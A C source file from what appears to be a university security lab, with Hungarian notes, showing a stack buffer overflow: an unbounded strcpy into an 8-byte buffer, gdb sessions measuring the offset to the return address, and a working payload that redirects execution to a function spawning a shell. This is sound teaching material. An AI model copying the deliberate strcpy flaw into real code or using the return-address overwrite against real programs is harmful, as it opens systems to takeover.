#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void not_called() {
    printf("Enjoy your shell!\n");
    system("/bin/bash");
}
//$1 = (char (*)[8]) 0xffffc7ac
//$2 = (void *) 0xffffc7b8
/*
1.
 pontos cim: (gdb) print not_called
$1 = {void ()} 0x8049186 <not_called>

2.
Breakpoint 1, vulnerable_function (string=0xffffca33 "AAA") at main.c:36
warning: Source file is more recent than executable.
36      x/32bx &buffer
(gdb) next
37      x/32xw $esp
(gdb) print $ebp - &buffer
First argument of `-' is a pointer and second argument is neither
an integer nor a pointer of the same type.
(gdb) print (int)$ebp - (int)&buffer
$2 = 12

===
Breakpoint 1 at 0x80491ca: file main.c, line 36.

$1 = {void ()} 0x8049186 <not_called>
/*

gdb ./app_32
break main
break vulnerable_function
run AAAA
list
info args
bt
continue
list
info args
info locals
print &buffer
x/16bx &buffer
next
x/16bx &buffer
run AAAAAAAAAAAAAAAA
continue
x/32bx &buffer
x/32xw $esp
disassemble vulnerable_function
quit
*/
/*
teofil-antal@CAESAR:/mnt/c/Users/azaze/Desktop/secit/Securitate-IT/task-1/task-1$ ./app_32 $'AAAAAAAAAAAAAAAA\x86\x91\x04\x08'
Enjoy your shell!
teofil-antal@CAESAR:/mnt/c/Users/azaze/Desktop/secit/Securitate-IT/task-1/task-1$ 

1. megneztuk a buffer cimet
2. megneztuk az ebp cimet
3. kiszamoltuk a kulonbseget (12) Ez azt jelenti: A buffer elejétől a saved EBP-ig 12 byte van.
4. a return address az EBP utan 4 byte-ra van


1. (int)$ebp - (int)&buffer = 12
2. Return address = $ebp + 4
3. Tehát: (12) + 4 = 16
*/
// amennyiben a bemenet hosszabb mint 8 byte, akkor kalap, mert a strcpy() nem véd az overflow ellen.
void vulnerable_function(char* string) {
    char buffer[8];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {

    if (argc != 2) {
	   printf("Please specify one argument!\n");
	   return 0;
    }

    vulnerable_function(argv[1]);

    return 0;
}
